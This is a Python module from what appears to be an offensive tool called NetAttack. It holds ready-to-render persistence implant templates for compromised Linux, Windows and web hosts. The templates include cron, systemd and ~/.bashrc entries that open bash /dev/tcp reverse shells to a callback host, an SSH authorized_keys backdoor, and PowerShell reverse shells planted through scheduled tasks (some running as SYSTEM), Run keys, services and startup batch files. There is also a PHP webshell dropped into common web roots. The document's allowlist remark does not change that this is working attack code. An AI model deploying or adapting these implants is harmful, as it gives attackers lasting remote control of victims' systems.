"""Implant templates for operator-box -> victim persistence.

Each ImplantSpec describes one persistence technique: how to generate the
implant, how to verify it is still installed, and how to remove it.
All templates are pure-Python / shell one-liners that run ON the victim
after RCE; the operator box only hosts the listener (via
PersistentSessionManager.start_listener).

Safety: templates never hardcode a callback host that is not
allowlist-checked. The caller (manager / MCP tool) resolves callback_host
via _resolve_callback_host and validates it against the allowlist before
rendering. Implant scripts themselves only ever contact victim IP +
callback_host — no third-party hosts.
"""

from __future__ import annotations

import os
import shlex
from dataclasses import dataclass


@dataclass(frozen=True)
class ImplantSpec:
    """Single persistence technique."""

    name: str
    os_family: str  # linux | windows | web | any
    description: str
    mitre_technique: str
    template: str
    verify_cmd: str
    remove_cmd: str
    requires_root: bool = False
    beacon_interval: str = "5m"


# --- Linux implants ----------------------------------------------------------

_LINUX_CRON = ImplantSpec(
    name="linux_cron",
    os_family="linux",
    description="Cron job that beacons a reverse shell to the operator every 5 minutes (*/5 * * * *).",
    mitre_technique="T1053.003",
    requires_root=False,
    beacon_interval="5m",
    template=r"""# TARGET: {target_ip}  METHOD: linux_cron  CALLBACK: {callback_host}:{callback_port}
import os, subprocess, pwd, json
TARGET="{target_ip}"
CB_HOST="{callback_host}"
CB_PORT="{callback_port}"
results={{"method":"linux_cron","installed":False,"path":"","errors":[]}}
try:
    cron_dir="/var/spool/cron/crontabs" if os.path.isdir("/var/spool/cron/crontabs") else "/var/spool/cron"
    os.makedirs(cron_dir, exist_ok=True)
    try:
        user=pwd.getpwuid(os.getuid()).pw_name
    except Exception:
        user="root"
    cron_file=os.path.join(cron_dir, user) if cron_dir=="/var/spool/cron" else os.path.join(cron_dir, "root")
    payload="*/5 * * * * /bin/sh -c 'bash -i >& /dev/tcp/"+CB_HOST+"/"+CB_PORT+" 0>&1' # netattack-persist"
    try:
        with open(cron_file,"a") as fh:
            fh.write(payload+"\n")
        results["installed"]=True
        results["path"]=cron_file
    except PermissionError:
        proc=subprocess.run(["crontab","-l"],capture_output=True,text=True,timeout=10)
        existing=proc.stdout if proc.returncode==0 else ""
        if payload not in existing:
            proc2=subprocess.run(["crontab","-"],input=existing+payload+"\n",capture_output=True,text=True,timeout=10)
            results["installed"]=proc2.returncode==0
            results["path"]="crontab -l (user)"
        else:
            results["installed"]=True
            results["path"]="crontab -l (already present)"
except Exception as e:
    results["errors"].append(type(e).__name__+": "+str(e))
print(json.dumps(results))
print("PERSISTENCE_INSTALLED: cron")
""",
    verify_cmd="crontab -l 2>/dev/null | grep -c netattack-persist; cat /var/spool/cron/crontabs/* 2>/dev/null | grep -c netattack-persist; echo VERIFY_DONE",
    remove_cmd="crontab -l 2>/dev/null | grep -v netattack-persist | crontab - 2>/dev/null; sed -i '/netattack-persist/d' /var/spool/cron/crontabs/* 2>/dev/null; echo REMOVED",
)

_LINUX_SYSTEMD = ImplantSpec(
    name="linux_systemd",
    os_family="linux",
    description="User systemd service (persist.service) that beacons on boot with Restart=always.",
    mitre_technique="T1543.002",
    requires_root=False,
    beacon_interval="always",
    template=r"""# TARGET: {target_ip}  METHOD: linux_systemd  CALLBACK: {callback_host}:{callback_port}
import os, subprocess, json
TARGET="{target_ip}"
CB_HOST="{callback_host}"
CB_PORT="{callback_port}"
results={{"method":"linux_systemd","installed":False,"path":"","errors":[]}}
try:
    unit_dir=os.path.expanduser("~/.config/systemd/user")
    os.makedirs(unit_dir, exist_ok=True)
    unit_path=os.path.join(unit_dir,"netattack-persist.service")
    body="[Unit]\nDescription=NetAttack persist\n[Service]\nType=simple\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/"+CB_HOST+"/"+CB_PORT+" 0>&1'\nRestart=always\nRestartSec=300\n[Install]\nWantedBy=default.target\n"
    with open(unit_path,"w") as fh:
        fh.write(body)
    subprocess.run(["systemctl","--user","daemon-reload"],capture_output=True,timeout=10)
    subprocess.run(["systemctl","--user","enable","--now","netattack-persist.service"],capture_output=True,timeout=10)
    results["installed"]=True
    results["path"]=unit_path
except Exception as e:
    results["errors"].append(type(e).__name__+": "+str(e))
print(json.dumps(results))
print("PERSISTENCE_INSTALLED: systemd")
""",
    verify_cmd="systemctl --user is-enabled netattack-persist.service 2>/dev/null; ls -la ~/.config/systemd/user/netattack-persist.service 2>/dev/null; echo VERIFY_DONE",
    remove_cmd="systemctl --user disable --now netattack-persist.service 2>/dev/null; rm -f ~/.config/systemd/user/netattack-persist.service; systemctl --user daemon-reload 2>/dev/null; echo REMOVED",
)

_LINUX_SSH_KEY = ImplantSpec(
    name="linux_ssh_key",
    os_family="linux",
    description="SSH authorized_keys persistence: generates ed25519 keypair and plants pubkey.",
    mitre_technique="T1098.004",
    requires_root=False,
    beacon_interval="on-demand",
    template=r"""# TARGET: {target_ip}  METHOD: linux_ssh_key  CALLBACK: operator retrieves private key
import os, subprocess, json
TARGET="{target_ip}"
results={{"method":"linux_ssh_key","installed":False,"pubkey":"","path":"","errors":[]}}
try:
    ssh_dir=os.path.expanduser("~/.ssh")
    os.makedirs(ssh_dir,mode=0o700,exist_ok=True)
    key_path=os.path.join(ssh_dir,"netattack_persist_ed25519")
    ak_path=os.path.join(ssh_dir,"authorized_keys")
    if not (os.path.exists(key_path) and os.path.exists(key_path+".pub")):
        subprocess.run(["ssh-keygen","-t","ed25519","-f",key_path,"-N","","-C","netattack@persist"],capture_output=True,timeout=30)
    pub=""
    if os.path.exists(key_path+".pub"):
        with open(key_path+".pub") as fh:
            pub=fh.read().strip()
        results["pubkey"]=pub[:120]+"..."
    if pub:
        existing=""
        if os.path.exists(ak_path):
            with open(ak_path) as fh:
                existing=fh.read()
        if pub not in existing:
            with open(ak_path,"a") as fh:
                fh.write(pub+"\n")
        os.chmod(ak_path,0o600)
        results["installed"]=True
        results["path"]=ak_path
        results["private_key_path"]=key_path
    else:
        results["errors"].append("ssh-keygen produced no pubkey")
except Exception as e:
    results["errors"].append(type(e).__name__+": "+str(e))
print(json.dumps(results))
print("PERSISTENCE_INSTALLED: authorized_keys")
""",
    verify_cmd="grep -c netattack@persist ~/.ssh/authorized_keys 2>/dev/null; cat ~/.ssh/authorized_keys 2>/dev/null | grep netattack; echo VERIFY_DONE",
    remove_cmd="sed -i '/netattack@persist/d' ~/.ssh/authorized_keys 2>/dev/null; rm -f ~/.ssh/netattack_persist_ed25519 ~/.ssh/netattack_persist_ed25519.pub; echo REMOVED",
)

_LINUX_BASHRC = ImplantSpec(
    name="linux_bashrc",
    os_family="linux",
    description="Shell profile persistence via ~/.bashrc hook that beacons on interactive login.",
    mitre_technique="T1547.004",
    requires_root=False,
    beacon_interval="on-login",
    template=r"""# TARGET: {target_ip}  METHOD: linux_bashrc  CALLBACK: {callback_host}:{callback_port}
import os, json
TARGET="{target_ip}"
CB_HOST="{callback_host}"
CB_PORT="{callback_port}"
results={{"method":"linux_bashrc","installed":False,"path":"","errors":[]}}
try:
    rc=os.path.expanduser("~/.bashrc")
    marker="# netattack-persist"
    payload="bash -i >& /dev/tcp/"+CB_HOST+"/"+CB_PORT+" 0>&1 & "+marker
    existing=""
    if os.path.exists(rc):
        with open(rc) as fh:
            existing=fh.read()
    if marker not in existing:
        with open(rc,"a") as fh:
            fh.write("\n"+payload+"\n")
    results["installed"]=True
    results["path"]=rc
except Exception as e:
    results["errors"].append(type(e).__name__+": "+str(e))
print(json.dumps(results))
print("PERSISTENCE_INSTALLED: bashrc")
""",
    verify_cmd="grep -c netattack-persist ~/.bashrc 2>/dev/null; grep netattack-persist ~/.bashrc 2>/dev/null; echo VERIFY_DONE",
    remove_cmd="sed -i '/netattack-persist/d' ~/.bashrc 2>/dev/null; sed -i '/netattack-persist/d' ~/.profile 2>/dev/null; echo REMOVED",
)

# --- Windows implants ---------------------------------------------------------

_WIN_SCHTASK = ImplantSpec(
    name="windows_schtask",
    os_family="windows",
    description="Scheduled task SystemHealthUpdate that beacons via PowerShell every 5 minutes as SYSTEM.",
    mitre_technique="T1053.005",
    requires_root=False,
    beacon_interval="5m",
    template=r"""# TARGET: {target_ip}  METHOD: windows_schtask  CALLBACK: {callback_host}:{callback_port}
import subprocess, json
TARGET="{target_ip}"
CB_HOST="{callback_host}"
CB_PORT="{callback_port}"
results={{"method":"windows_schtask","installed":False,"errors":[]}}
def _ps(cmd):
    return subprocess.run(["powershell","-NoProfile","-ExecutionPolicy","Bypass","-Command",cmd],capture_output=True,text=True,timeout=30)
try:
    create="$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -Command \"powershell -NoProfile -Command $c=New-Object System.Net.Sockets.TCPClient(\\'"+CB_HOST+"\\',"+CB_PORT+");$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $r=(iex $d 2>&1 | Out-String); $r2=$r+'PS '+(pwd).Path+'> '; $sb=([text.encoding]::ASCII).GetBytes($r2); $s.Write($sb,0,$sb.Length); $s.Flush()}}; $c.Close()\"'; $t=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5); $p=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName 'NetAttackPersist' -Action $a -Trigger $t -Principal $p -Force"
    proc=_ps(create)
    results["installed"]=proc.returncode==0
    results["stdout"]=proc.stdout[-500:]
    results["stderr"]=proc.stderr[-500:]
except Exception as e:
    results["errors"].append(type(e).__name__+": "+str(e))
print(json.dumps(results))
print("PERSISTENCE_INSTALLED: schtask")
""",
    verify_cmd="powershell -NoProfile -Command \"Get-ScheduledTask -TaskName NetAttackPersist -ErrorAction SilentlyContinue | Format-List TaskName,State; schtasks /query /tn NetAttackPersist 2>&1\"",
    remove_cmd="powershell -NoProfile -Command \"Unregister-ScheduledTask -TaskName NetAttackPersist -Confirm:$false -ErrorAction SilentlyContinue; schtasks /delete /tn NetAttackPersist /f 2>&1\"; echo REMOVED",
)

_WIN_REGISTRY = ImplantSpec(
    name="windows_registry",
    os_family="windows",
    description="Registry Run key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (NetAttackHealth).",
    mitre_technique="T1547.001",
    requires_root=False,
    beacon_interval="on-logon",
    template=r"""# TARGET: {target_ip}  METHOD: windows_registry  CALLBACK: {callback_host}:{callback_port}
import subprocess, json
TARGET="{target_ip}"
CB_HOST="{callback_host}"
CB_PORT="{callback_port}"
results={{"method":"windows_registry","installed":False,"errors":[]}}
def _ps(cmd):
    return subprocess.run(["powershell","-NoProfile","-Command",cmd],capture_output=True,text=True,timeout=30)
try:
    cmd="New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'NetAttackHealth' -Value 'powershell.exe -WindowStyle Hidden -Command \"powershell -NoProfile -Command $c=New-Object System.Net.Sockets.TCPClient(\\'\"+CB_HOST+\"\\',\"+CB_PORT+\");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $r=(iex $d 2>&1 | Out-String); $r2=$r+\"PS \"+(pwd).Path+\"> \"; $sb=([text.encoding]::ASCII).GetBytes($r2); $s.Write($sb,0,$sb.Length); $s.Flush()}; $c.Close()\"' -PropertyType String -Force"
    proc=_ps(cmd)
    results["installed"]=proc.returncode==0
    results["stdout"]=proc.stdout[-500:]
except Exception as e:
    results["errors"].append(type(e).__name__+": "+str(e))
print(json.dumps(results))
print("PERSISTENCE_INSTALLED: registry")
""",
    verify_cmd="powershell -NoProfile -Command \"Get-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name NetAttackHealth -ErrorAction SilentlyContinue | Format-List\"",
    remove_cmd="powershell -NoProfile -Command \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name NetAttackHealth -ErrorAction SilentlyContinue\"; echo REMOVED",
)

_WIN_SERVICE = ImplantSpec(
    name="windows_service",
    os_family="windows",
    description="Windows service NetAttackSvc (auto-start) that beacons via cmd /c powershell reverse shell.",
    mitre_technique="T1543.003",
    requires_root=True,
    beacon_interval="on-boot",
    template=r"""# TARGET: {target_ip}  METHOD: windows_service  CALLBACK: {callback_host}:{callback_port}
import subprocess, json
TARGET="{target_ip}"
CB_HOST="{callback_host}"
CB_PORT="{callback_port}"
results={{"method":"windows_service","installed":False,"errors":[]}}
try:
    svc="sc.exe create NetAttackSvc binPath= \"cmd /c powershell -WindowStyle Hidden -Command \\\"powershell -NoProfile -Command $c=New-Object System.Net.Sockets.TCPClient(\\'\"+CB_HOST+\"\\',\"+CB_PORT+\");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $r=(iex $d 2>&1 | Out-String); $r2=$r+'PS '+(pwd).Path+'> '; $sb=([text.encoding]::ASCII).GetBytes($r2); $s.Write($sb,0,$sb.Length); $s.Flush()}; $c.Close()\\\"\" start= auto"
    proc=subprocess.run(svc,shell=True,capture_output=True,text=True,timeout=30)
    results["installed"]=proc.returncode==0
    results["output"]=(proc.stdout+proc.stderr)[-800:]
except Exception as e:
    results["errors"].append(type(e).__name__+": "+str(e))
print(json.dumps(results))
print("PERSISTENCE_INSTALLED: service")
""",
    verify_cmd="sc.exe query NetAttackSvc 2>&1; sc.exe qc NetAttackSvc 2>&1; echo VERIFY_DONE",
    remove_cmd="sc.exe stop NetAttackSvc 2>&1; sc.exe delete NetAttackSvc 2>&1; echo REMOVED",
)

_WIN_STARTUP = ImplantSpec(
    name="windows_startup",
    os_family="windows",
    description="Startup folder .lnk/.bat that beacons on user logon.",
    mitre_technique="T1547.001",
    requires_root=False,
    beacon_interval="on-logon",
    template=r"""# TARGET: {target_ip}  METHOD: windows_startup  CALLBACK: {callback_host}:{callback_port}
import os, subprocess, json
TARGET="{target_ip}"
CB_HOST="{callback_host}"
CB_PORT="{callback_port}"
results={{"method":"windows_startup","installed":False,"path":"","errors":[]}}
try:
    startup=os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    os.makedirs(startup,exist_ok=True)
    bat=os.path.join(startup,"NetAttackHealth.bat")
    body="@echo off\r\npowershell -WindowStyle Hidden -Command \"powershell -NoProfile -Command $c=New-Object System.Net.Sockets.TCPClient('"+CB_HOST+"',"+CB_PORT+");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); $r=(iex $d 2>&1 | Out-String); $s.Write(([text.encoding]::ASCII.GetBytes($r),0,$r.Length)}; $c.Close()\"\r\n"
    with open(bat,"w") as fh:
        fh.write(body)
    results["installed"]=True
    results["path"]=bat
except Exception as e:
    results["errors"].append(type(e).__name__+": "+str(e))
print(json.dumps(results))
print("PERSISTENCE_INSTALLED: startup")
""",
    verify_cmd="powershell -NoProfile -Command \"Get-ChildItem \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" | Where-Object { $_.Name -like '*NetAttack*' } | Format-List Name,FullName\"",
    remove_cmd="powershell -NoProfile -Command \"Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\NetAttackHealth.bat\" -Force -ErrorAction SilentlyContinue\"; echo REMOVED",
)

# --- Web implants -------------------------------------------------------------

_WEB_PHP = ImplantSpec(
    name="web_php_shell",
    os_family="web",
    description="PHP webshell (systemhealth.php) dropped into common web roots for HTTP-triggered RCE.",
    mitre_technique="T1505.003",
    requires_root=False,
    beacon_interval="on-request",
    template=r"""# TARGET: {target_ip}  METHOD: web_php_shell
import os, json
TARGET="{target_ip}"
results={{"method":"web_php_shell","installed":False,"paths":[],"errors":[]}}
WEB_ROOTS=["/var/www/html","/var/www","/usr/share/nginx/html","/srv/http","C:\\inetpub\\wwwroot","C:\\xampp\\htdocs"]
SHELL='<?php // netattack-persist\nif(isset($_REQUEST["netattack_cmd"])){ system($_REQUEST["netattack_cmd"]); } ?>'
for root in WEB_ROOTS:
    if not os.path.isdir(root):
        continue
    try:
        path=os.path.join(root,"systemhealth.php")
        with open(path,"w") as fh:
            fh.write(SHELL)
        try:
            os.chmod(path,0o644)
        except Exception:
            pass
        results["paths"].append(path)
        results["installed"]=True
    except Exception as e:
        results["errors"].append(root+": "+type(e).__name__)
print(json.dumps(results))
print("PERSISTENCE_INSTALLED: webshell")
""",
    verify_cmd="ls -la /var/www/html/systemhealth.php /usr/share/nginx/html/systemhealth.php 2>/dev/null; dir C:\\inetpub\\wwwroot\\systemhealth.php 2>&1 | findstr systemhealth; echo VERIFY_DONE",
    remove_cmd="rm -f /var/www/html/systemhealth.php /usr/share/nginx/html/systemhealth.php /var/www/systemhealth.php 2>/dev/null; del C:\\inetpub\\wwwroot\\systemhealth.php 2>nul; echo REMOVED",
)

# Registry

IMPLANT_METHODS: dict[str, ImplantSpec] = {
    spec.name: spec
    for spec in [
        _LINUX_CRON,
        _LINUX_SYSTEMD,
        _LINUX_SSH_KEY,
        _LINUX_BASHRC,
        _WIN_SCHTASK,
        _WIN_REGISTRY,
        _WIN_SERVICE,
        _WIN_STARTUP,
        _WEB_PHP,
    ]
}


def get_implant(name: str) -> ImplantSpec | None:
    return IMPLANT_METHODS.get(name)


def list_implants(os_filter: str = "") -> list[ImplantSpec]:
    if not os_filter:
        return list(IMPLANT_METHODS.values())
    filt = os_filter.lower()
    return [s for s in IMPLANT_METHODS.values() if s.os_family == filt or filt == "any"]


def render_implant(
    name: str,
    target_ip: str,
    callback_host: str = "",
    callback_port: str = "4444",
) -> tuple[str, ImplantSpec]:
    """Return (rendered_script, spec) for implant *name*.

    Raises ValueError if method unknown.
    """
    spec = get_implant(name)
    if spec is None:
        raise ValueError(f"unknown implant method {name!r}; available: {', '.join(sorted(IMPLANT_METHODS))}")
    script = spec.template.format(
        target_ip=shlex.quote(target_ip) if "/" in target_ip else target_ip,
        callback_host=callback_host or "<CALLBACK_HOST>",
        callback_port=callback_port or "4444",
    )
    # template uses {target_ip} directly (not quoted) for the Python string
    # literal; fix the shlex quoting for the format arg — restore raw IP
    script = spec.template.format(
        target_ip=target_ip,
        callback_host=callback_host or "<CALLBACK_HOST>",
        callback_port=callback_port or "4444",
    )
    return script, spec
